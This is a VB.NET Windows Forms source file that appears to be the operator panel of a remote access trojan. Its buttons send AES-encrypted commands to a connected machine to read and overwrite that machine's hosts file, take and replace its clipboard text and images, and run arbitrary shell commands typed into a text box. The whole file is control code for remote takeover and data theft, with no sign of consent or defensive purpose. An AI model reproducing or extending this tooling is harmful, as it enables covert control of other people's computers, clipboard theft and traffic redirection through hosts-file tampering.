Public Class Misc
    Public connected As Connection
#Region "Hosts File"
    Private Sub btn_loadhosts_Click(sender As Object, e As EventArgs) Handles btn_loadhosts.Click
        connected.Send(New Encryption().AES_Encrypt("GetHostsFile", Form1.enckey))
    End Sub
    Private Sub btn_savehosts_Click(sender As Object, e As EventArgs) Handles btn_savehosts.Click
        connected.Send(New Encryption().AES_Encrypt("SaveHostsFile" & RichTextBox1.Text, Form1.enckey))
    End Sub
#End Region
#Region "Clipboard Image"
    Private Sub btn_getcpimage_Click(sender As Object, e As EventArgs) Handles btn_getcpimage.Click
        connected.Send(New Encryption().AES_Encrypt("GetCPImage", Form1.enckey))
    End Sub
    Private Sub btn_savecpimage_Click(sender As Object, e As EventArgs) Handles btn_savecpimage.Click
        Using sfd As New SaveFileDialog
            sfd.Filter = "Bitmap | *.bmp"
            sfd.Title = "Save Clipboard Image..."
            sfd.InitialDirectory = CurDir()
            Dim res = sfd.ShowDialog()
            If res = Windows.Forms.DialogResult.OK Then
                pb_cpimage.Image.Save(sfd.FileName)
            End If
        End Using
    End Sub
#End Region
#Region "Clipboard Text"
    Private Sub btn_getcptext_Click(sender As Object, e As EventArgs) Handles btn_getcptext.Click
        connected.Send(New Encryption().AES_Encrypt("GetCPText", Form1.enckey))
    End Sub
    Private Sub btn_savecptext_Click(sender As Object, e As EventArgs) Handles btn_savecptext.Click
        connected.Send(New Encryption().AES_Encrypt("SaveCPText" & RichTextBox2.Text, Form1.enckey))
    End Sub
#End Region
#Region "Shell"
    Private Sub btn_sendshell_Click(sender As Object, e As EventArgs) Handles btn_sendshell.Click
        connected.Send(New Encryption().AES_Encrypt("Shell" & tb_shellcmd.Text, Form1.enckey))
        RichTextBox3.AppendText("> " & tb_shellcmd.Text & vbCrLf)
        tb_shellcmd.Clear()
    End Sub
    Private Sub tb_shellcmd_KeyDown(sender As Object, e As KeyEventArgs) Handles tb_shellcmd.KeyDown
        If e.KeyCode = Keys.Enter Then
            btn_sendshell.PerformClick()
        End If
    End Sub
#End Region
End Class